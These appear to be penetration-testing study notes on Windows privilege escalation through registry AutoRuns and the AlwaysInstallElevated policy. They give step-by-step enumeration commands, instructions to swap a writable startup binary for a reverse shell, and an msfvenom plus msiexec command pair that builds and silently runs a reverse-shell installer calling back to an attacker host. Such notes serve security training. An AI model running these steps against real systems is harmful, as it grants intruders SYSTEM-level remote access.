Registry Exploits


1. AutoRuns

Windows can be configured to run commands at startup, with elevated privileges.
These “AutoRuns” are configured in the Registry. If we are able to write to an 
AutoRun executable, and are able to restart the system, we get a SYSTEM shell.

Process:

Step 1: Run winPEAS with applicationsinfo and identify the Autorun application
	where anyone can write

Step 2: Or manually enumerate the AutoRun executables
	
	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Step 3: And use accesschk to verify each path that is user writable or not.
	
	.\accesschk.exe /accepteula -wvu <path>

Step 4: Identify the path and create a backup of the original file.

Step 5: Replace that file with our reverse shell. 

Step 6: Now restart the system and we will get a reverse shell.


2. AlwaysInstallElevated

MSI files are package files used to install applications. These files run with 
the permissions of the user trying to install them. Windows allows for these 
installers to be run with elevated (i.e. admin) privileges.

AlwaysInstallElevated of HKLM and HKCU both should be set to 1 to work this method.


Process:

Step 1: Run winPEAS with windowscreds 
	
	.\winPEASany.exe quiet windowscreds

Step 2: Or verify those values Manually

	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Step 3: Create a new reverse shell with msi file format. 

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f msi -o reverse.msi

Step 4: Copy the reverse shell file to the windows and run.
	
	msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

Step 5:	we will get a reverse shell.
